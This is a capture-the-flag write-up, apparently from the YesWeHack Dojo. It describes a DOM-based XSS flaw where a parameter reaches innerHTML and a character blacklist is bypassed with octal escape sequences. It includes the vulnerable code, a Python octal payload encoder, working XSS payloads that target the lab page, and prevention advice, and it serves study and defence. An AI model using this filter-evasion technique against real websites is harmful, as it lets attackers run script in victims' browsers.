# Cross-site Scripting (XSS) - DOM trought ($cmd) parameter using octal encoding (CWE-79)

## Description of the vulnerability

Cross-Site Scripting (XSS) is a type of vulnerability that allows an attacker to inject malicious code into a web page. This code is executed by the victim's web browser, allowing the attacker to steal sensitive information such as login credentials, manipulate the contents of the web page, or perform other unauthorized actions. In a DOM-based XSS attack, the attacker injects malicious code into the DOM (Document Object Model), which is then executed by the browser when the page is loaded or when a user interacts with the page in a certain way.

## Exploitation - steps to reproduce

> **source code**

In this situation, we have 2 inputs parameters : $username and $cmd

Let's take a look at the javascript source code :

```js
<script>

//Cass to create a new player:
class Player {
  constructor(status, name, spawn, grade, quotes) { 
    this.whoami = name;
    this.groups = grade;
    this.pwd = spawn;
    this.ls = quotes;
    this.connection = status;
  }
};

//Create new players: 'butters' and 'cartman':
const butters = new Player( 'online', 'Butters', '~/School', '4th Grade', Array('Hey Fellas!', 'Oh boy!', 'A little chaos...') );  
const cartman = new Player( 'online', 'Cartman', '~/School', '4th Grade', Array('Kewl', 'WassUP!!') );

//Add players to the `users` object:
let users = {};
let addUser = Object.assign(users, { butters, cartman });

//Cartman to rescue!!
var username = '$username';
var cmd = '$cmd';

/* [Help Guide]
* (1) => Check `user` if it's valid, if not valid (||) user = 'butters'. 
* (2) => Check if the `command` exists, if not valid (||) command = 'not found'
*/
var user = users[username] || users['butters']//(1)
var command = user[cmd] || 'Command \''+cmd+'\' not found.';//(2)

//Output:
document.getElementById('inpt').innerHTML = cmd+'<br>'+command;
document.getElementById('user').innerText = user.whoami+'@vr';

</script>
```

The code create 2 object Player and initialize them with differents attributs.
Then, each attributs can be accessed using the $username parameter to select a player, and $cmd paramater to select wich attribut to print. If the username specified or the command specified is not found, the user fallback to 'butters' and the command printed is 'not found'.

What is interesting here is this line : 
```js
document.getElementById('inpt').innerHTML = cmd+'<br>'+command;
```
This line use the `.innerHTML` tag, who's property is used for DOM manipulation. I can be used to examine/modify the content of the HTML page, meaning we can use it to inject some javascript code for Cross-site scripting.

> **Blacklisted characters**

All the following characters are blacklisted, and cannot be injected :
```"'`<>```
We cannot also use the escape characters ```\x \u``` used for hexadecimal and unicode character injection inside a string.
It look like we cannot inject any character useful to inject javascript code.

> **The flaw**

Actually, even if ```\x \u``` are blacklisted, we can still inject some special characters like `<>` or `'`, using another escape sequence character : the octal esacque sequence character. We can use it juste like the Unicode or Hexadecimal one to inject any ASCII character using it's octal code. 

For exemple the string ```Hello, world``` would be ```\110\145\154\154\157\54\40\167\157\162\154\144``` in octal numbers. 

> **Testing the injection**

Using a simple python code, we can translate any payload easily to octal code :
```py
import re
payload = input("Enter payload : ")
char_array = [oct(ord(c)) for c in payload]
pattern = r"[' ,\[\]]+"
result = re.sub(pattern,'',str(char_array))
print("Formated payload :\n",result.replace('0o','\\'))
```
This code take for input your payload, convert it to octal code for each character and then print all the codes in the good format for our injection/ We can try to use with a common XSS payload :
```js
<img src='x' onerror='alert("XSS")'>
```

![](dojo20/img/ywh-1.png)

Now let's try try it on the website : 

![](dojo20/img/ywh-2.png)

The octal encoding method is working, we can successfully execute javascript code !

## PoC

> **Completing the challenge**

Now that we have a working XSS, we can finish this challenge, who's main goal is to change the status of the player "Butters" from "online" to "offline".

This can be done using the following XSS payload :
```js
<img src='x' onerror='users.butters.connection = "offline";'>
```
and in octal code :
```
\74\151\155\147\40\163\162\143\75\47\170\47\40\157\156\145\162\162\157\162\75\47\165\163\145\162\163\56\142\165\164\164\145\162\163\56\143\157\156\156\145\143\164\151\157\156\40\75\40\42\157\146\146\154\151\156\145\42\73\47\76
```

We can complete the challenge by login in as Cartman and modifying Butters connection status :

![](dojo20/img/ywh-3.png)

## How to prevent :

* Validation of user input before using it in `.innerHTML`
* Better sanitization of users input, like adding octal encoding to the blacklist
* Use of content security policy to specify which sources are allowed to execute scripts

More [here](https://portswigger.net/web-security/cross-site-scripting/preventing)...

## Conclusion

As always , thanks for the dojo, it's still really fun to play with

#### #YesWeRHackers

## Sources

https://portswigger.net/web-security/cross-site-scripting/preventing
https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html
https://dev.to/caffiendkitten/innerhtml-cross-site-scripting-agc



